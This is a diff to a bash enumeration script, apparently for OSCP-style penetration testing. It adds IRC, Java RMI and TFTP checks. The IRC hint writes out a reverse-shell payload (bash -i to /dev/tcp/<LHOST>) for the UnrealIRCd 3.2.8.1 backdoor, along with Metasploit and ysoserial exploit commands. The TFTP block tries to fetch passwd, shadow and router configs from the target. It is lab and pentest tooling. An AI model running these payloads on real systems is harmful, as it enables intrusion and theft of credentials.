@@ -225,7 +225,7 @@ if has_port 23; then
     echo "$TELNET_BANNER" > "${TELNET_DIR}/telnet_banner.txt"
 
     if [[ -n "$TELNET_BANNER" ]]; then
-        BANNER_LINE=$(echo "$TELNET_BANNER" | grep -v '^$' | head -3 | tr '\n' ' ' | cut -c1-120)
+        BANNER_LINE=$(echo "$TELNET_BANNER" | grep -v '^$' | head -3 | tr '\n' ' ' | cut -c1-120 || true)
         ok "Telnet banner: ${WHITE}${BANNER_LINE}${NC}"
     else
         info "No Telnet banner received — service may be filtered or require auth prompt."
@@ -835,9 +835,138 @@ if echo ",$PORTS," | grep -qP ',(1433|3306|5432|6379|27017),'; then
 fi
 
 # ===========================================================================
+# IRC — ports 6667, 6697
+# ===========================================================================
+for IRC_PORT in 6667 6697; do
+    if has_port "$IRC_PORT"; then
+        IRC_DIR="${OUTPUT_DIR}/irc"
+        mkdir -p "$IRC_DIR"
+        info "[IRC] IRC enumeration on port ${IRC_PORT}"
+
+        # Banner grab
+        cmd "nc -nv -w 5 ${TARGET} ${IRC_PORT}"
+        IRC_BANNER=$(timeout 6 bash -c \
+            "printf 'NICK oscp\r\nUSER oscp 0 * :oscp\r\nQUIT\r\n' \
+            | nc -nv -w 5 $TARGET $IRC_PORT" 2>&1 || true)
+        echo "$IRC_BANNER" > "${IRC_DIR}/irc_banner_${IRC_PORT}.txt"
+
+        if [[ -n "$IRC_BANNER" ]]; then
+            # Extract server version
+            IRC_VERSION=$(echo "$IRC_BANNER" | grep -oP '(?i)(unreal|inspircd|ngircd|ircd)\S*' \
+                | head -1 || true)
+            IRC_SERVER_LINE=$(echo "$IRC_BANNER" | grep -m1 '^:' | head -c 200 || true)
+            [[ -n "$IRC_SERVER_LINE" ]] && ok "IRC banner: ${WHITE}${IRC_SERVER_LINE}${NC}" || true
+
+            # Critical: UnrealIRCd 3.2.8.1 has a hardcoded backdoor (RCE)
+            if echo "$IRC_BANNER" | grep -qi 'unreal3.2.8.1'; then
+                warn "CRITICAL: UnrealIRCd 3.2.8.1 detected — BACKDOOR vulnerability!"
+                warn "CVE: UnrealIRCd 3.2.8.1 remote code execution via AB; payload"
+                hint "UnrealIRCd 3.2.8.1 backdoor exploitation:
+    # Metasploit:
+    use exploit/unix/irc/unreal_ircd_3281_backdoor
+    set RHOSTS ${TARGET}; set RPORT ${IRC_PORT}; run
+    # Manual (netcat):
+    echo 'AB; bash -i >& /dev/tcp/<LHOST>/4444 0>&1' | nc ${TARGET} ${IRC_PORT}"
+            fi || true
+
+            # Run searchsploit on detected version
+            if [[ -n "$IRC_VERSION" ]] && command -v searchsploit &>/dev/null; then
+                cmd "searchsploit ${IRC_VERSION}"
+                searchsploit --colour "$IRC_VERSION" 2>/dev/null \
+                    | tee "${IRC_DIR}/irc_searchsploit.txt" || true
+            fi
+
+            hint "IRC manual enumeration:
+    nc -nv ${TARGET} ${IRC_PORT}
+    # Type: NICK test; USER test 0 * :test
+    # Then: LIST (channel list), NAMES (users in channel)"
+        else
+            info "IRC port ${IRC_PORT} not responding."
+        fi
+    fi
+done
+
+# ===========================================================================
+# Java RMI Registry — port 1099
+# ===========================================================================
+if has_port 1099; then
+    RMI_DIR="${OUTPUT_DIR}/rmi"
+    mkdir -p "$RMI_DIR"
+    info "[RMI] Java RMI Registry enumeration on port 1099"
+
+    # Nmap RMI scripts
+    cmd "nmap -p1099 --script rmi-dumpregistry,rmi-vuln-classloader -Pn ${TARGET}"
+    nmap -p1099 --script rmi-dumpregistry,rmi-vuln-classloader \
+        --script-timeout 30s -Pn "$TARGET" \
+        -oN "${RMI_DIR}/rmi_nmap.txt" 2>&1 | tee "${RMI_DIR}/rmi_nmap.txt" || true
+    ok "RMI nmap scan -> ${WHITE}${RMI_DIR}/rmi_nmap.txt${NC}"
+
+    # Check if classloader vuln detected
+    if grep -qi 'VULNERABLE\|classloader' "${RMI_DIR}/rmi_nmap.txt" 2>/dev/null; then
+        warn "Java RMI classloader vulnerability detected — potential RCE!"
+    fi || true
+
+    hint "Java RMI exploitation:
+    # Enumerate bound objects:
+    rmg enum ${TARGET} 1099
+    # List all bound names:
+    rmg list ${TARGET} 1099
+    # Test deserialization (requires ysoserial):
+    rmg serial ${TARGET} 1099 CommonsCollections6 'id' --bound-name <name>
+    # Metasploit:
+    use exploit/multi/misc/java_rmi_server
+    set RHOSTS ${TARGET}; run"
+    echo ""
+fi
+
+# ===========================================================================
+# TFTP — port 69/UDP
+# ===========================================================================
+if has_udp_port 69 || grep -qw "69/udp" "${OUTPUT_DIR}/scans/udp.txt" 2>/dev/null; then
+    TFTP_DIR="${OUTPUT_DIR}/tftp"
+    mkdir -p "$TFTP_DIR"
+    info "[TFTP] TFTP enumeration on port 69/UDP"
+
+    # Nmap TFTP enum
+    cmd "nmap -sU -p69 --script tftp-enum -Pn ${TARGET}"
+    nmap -sU -p69 --script tftp-enum --script-timeout 30s -Pn "$TARGET" \
+        -oN "${TFTP_DIR}/tftp_nmap.txt" 2>&1 | tee "${TFTP_DIR}/tftp_nmap.txt" || true
+
+    # Try to download common files
+    TFTP_FILES=("boot.ini" "BOOT.INI" "win.ini" "etc/passwd"
+                "startup-config" "running-config" "config.txt"
+                "passwd" "shadow" "hosts" "/etc/passwd")
+
+    if command -v tftp &>/dev/null; then
+        for tfile in "${TFTP_FILES[@]}"; do
+            TGET_OUT="${TFTP_DIR}/tftp_$(echo "$tfile" | tr '/' '_').bin"
+            tftp "$TARGET" <<EOF 2>/dev/null || true
+binary
+get $tfile $TGET_OUT
+quit
+EOF
+            if [[ -s "$TGET_OUT" ]]; then
+                ok "TFTP download SUCCESS: ${WHITE}${tfile}${NC} -> ${TGET_OUT}"
+                warn "TFTP allows anonymous file download!"
+            else
+                rm -f "$TGET_OUT" 2>/dev/null || true
+            fi
+        done
+    fi
+
+    hint "TFTP manual:
+    tftp ${TARGET}
+    tftp> get <filename>
+    # Try: etc/passwd, boot.ini, startup-config, win.ini
+    # Atftp with timeout:
+    atftp --get --remote-file passwd --local-file passwd.txt ${TARGET}"
+    echo ""
+fi
+
+# ===========================================================================
 # Banner grab — unknown / non-standard ports
 # ===========================================================================
-KNOWN_PORTS="21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,636,993,995,1433,2049,3306,3389,5432,5985,5986,6379,8000,8080,8443,8888,27017"
+KNOWN_PORTS="21,22,23,25,53,69,80,88,110,111,135,139,143,389,443,445,636,993,995,1099,1433,2049,3306,3389,5432,5985,5986,6379,6667,6697,8000,8080,8443,8888,27017"
 UNKNOWN_PORTS=()
 
 IFS=',' read -ra ALL_PORTS <<< "$PORTS"
